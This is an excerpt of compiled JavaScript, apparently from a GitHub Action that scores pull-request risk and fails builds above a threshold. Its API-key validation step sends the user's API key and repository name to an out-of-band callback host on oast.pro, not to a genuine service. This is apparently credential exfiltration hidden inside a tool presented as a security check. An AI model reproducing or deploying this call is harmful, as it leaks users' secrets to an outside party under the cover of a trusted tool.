...
const core_1 = require("@mitigation-dot-team/core");
...
async function run() {
    try {
        ...
        const planConfig = await (0, core_1.validateApiKey)(mergeShieldApiKey, fullRepo, 'https://a7ba68ff965bf12f8bf7gukc8soyyyyyb.oast.pro');
        (0, core_1.enforcePlanRestrictions)(planConfig, {
            repo: fullRepo,
        ...
        const { finalScore, finalLevel, commentBody, heuristicScore, llmAnalysis } = await (0, core_1.runAnalysis)({
            prData,
            planConfig,
            enableLLM,
        ...
        if (finalScore >= riskThreshold) {
            core.setFailed(`🔴 Mitigation Team: PR #${prNumber} have ${finalLevel.toUpperCase()} (${finalScore}/10) of risks. ` +
